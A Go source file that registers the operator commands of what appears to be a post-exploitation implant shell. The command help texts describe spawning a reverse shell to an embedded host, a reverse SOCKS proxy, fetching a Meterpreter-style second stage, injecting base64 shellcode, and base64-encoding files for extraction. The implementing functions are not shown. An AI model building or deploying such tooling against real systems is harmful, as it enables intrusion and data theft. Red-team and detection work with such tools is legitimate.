package cmds

import "github.com/abiosoft/ishell"

func RegisterCommands(sh *ishell.Shell) {

	sh.AddCmd(addSubEnumCmds(&ishell.Cmd{
		Name: "enum",
		Help: "Run an enumeration script",
		Func: Enum,
	}))

	sh.AddCmd(&ishell.Cmd{
		Name:      "ls",
		Aliases:   []string{"l", "ll"},
		Help:      "ls [file]",
		LongHelp:  "List files and directories",
		Func:      Ls,
		Completer: CompLs,
	})

	sh.AddCmd(&ishell.Cmd{
		Name:      "cd",
		Help:      "cd [dir]",
		LongHelp:  "Change directories. Empty argument changes to $HOME",
		Func:      Cd,
		Completer: CompCd,
	})

	sh.AddCmd(&ishell.Cmd{
		Name: "..",
		Help: "Shortcut for cd ..",
		Func: CdUp,
	})

	sh.AddCmd(&ishell.Cmd{
		Name: "id",
		Help: "Shows current user data",
		Func: Id,
	})

	sh.AddCmd(&ishell.Cmd{
		Name:      "cp",
		Aliases:   []string{"copy"},
		Help:      "cp <source> <dest>",
		LongHelp:  "Copies files. UNC paths are supported on Windows",
		Func:      Cp,
		Completer: CompLs,
	})

	sh.AddCmd(&ishell.Cmd{
		Name:      "cat",
		Aliases:   []string{"type"},
		Help:      "cat [file]",
		LongHelp:  "Print out the contents of a file",
		Func:      Cat,
		Completer: CompLs,
	})

	sh.AddCmd(&ishell.Cmd{
		Name:     "env",
		Help:     "env [NAME=some value]",
		LongHelp: "Set environment variable, or print the current environment if no args are passed",
		Func:     Env,
	})

	sh.AddCmd(&ishell.Cmd{
		Name:     "shell",
		Aliases:  []string{"sh", "exec"},
		Help:     "shell <args>",
		LongHelp: "Executes a command on the underlying OS. Mind your OPSEC",
		Func:     Shell,
	})

	sh.AddCmd(&ishell.Cmd{
		Name:      "tree",
		Help:      "tree [dir]",
		LongHelp:  "Recursively list directory contents",
		Func:      Tree,
		Completer: CompCd,
	})

	sh.AddCmd(&ishell.Cmd{
		Name:      "rm",
		Aliases:   []string{"del"},
		Help:      "rm <file|dir>",
		LongHelp:  "Delete a file",
		Func:      Rm,
		Completer: CompLs,
	})

	sh.AddCmd(&ishell.Cmd{
		Name:    "ps",
		Aliases: []string{"tasklist"},
		Help:    "Print current processes",
		Func:    Ps,
	})

	sh.AddCmd(&ishell.Cmd{
		Name: "pwd",
		Help: "Print current working directory",
		Func: Pwd,
	})

	sh.AddCmd(&ishell.Cmd{
		Name: "sitrep",
		Help: "Print system information",
		Func: Sitrep,
	})

	sh.AddCmd(&ishell.Cmd{
		Name:     "fetch",
		Help:     "fetch <url> <dest>",
		LongHelp: "Download files over HTTP (and UNC on Windows)",
		Func:     Fetch,
	})

	sh.AddCmd(&ishell.Cmd{
		Name:      "zipcat",
		Help:      "zipcat <file>",
		LongHelp:  "Compress and Base64 a file, then print to Stdout",
		Func:      Zipcat,
		Completer: CompLs,
	})

	sh.AddCmd(&ishell.Cmd{
		Name:      "base64",
		Help:      "base64 <file>",
		LongHelp:  "Compress and Base64 a file, then print to Stdout",
		Func:      Base64,
		Completer: CompLs,
	})

	sh.AddCmd(&ishell.Cmd{
		Name:     "spawn",
		Help:     "spawn [host:port]",
		LongHelp: "Spawns a new shell to [host:port]. Spawns a new shell to the embedded host:port if no arguments are passed.",
		Func:     Spawn,
	})

	sh.AddCmd(&ishell.Cmd{
		Name:     "socks",
		Help:     "socks <remote_port>",
		LongHelp: "Starts a reverse socks proxy and reverse-forwards it to <port> on the embedded host. SSH connect info must be embedded at compile time.",
		Func:     Socks,
	})

	sh.AddCmd(&ishell.Cmd{
		Name:     "met",
		Help:     "met <https|tcp> <ip:port>",
		LongHelp: "Fetch a second stage from ip:port",
		Func:     Met,
	})

	sh.AddCmd(&ishell.Cmd{
		Name:     "inject",
		Help:     "inject <base64_shellcode>",
		LongHelp: "Execute shellcode",
		Func:     Inject,
	})
}
